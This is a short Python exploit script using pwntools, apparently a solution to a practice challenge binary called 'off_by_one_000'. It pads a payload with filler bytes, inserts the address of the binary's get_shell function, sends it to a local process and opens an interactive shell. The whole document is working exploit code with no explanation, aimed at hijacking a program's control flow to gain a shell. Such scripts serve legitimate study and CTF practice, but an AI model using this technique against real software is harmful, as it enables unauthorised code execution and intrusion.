from pwn import*

payload = ''
payload += 'a'*20
p=process('./off_by_one_000')
e =ELF('./off_by_one_000')
get_shell_addr = e.symbols['get_shell']
payload += p32(get_shell_addr)
payload += 'a'*0x100
p.sendline(payload)
p.interactive()
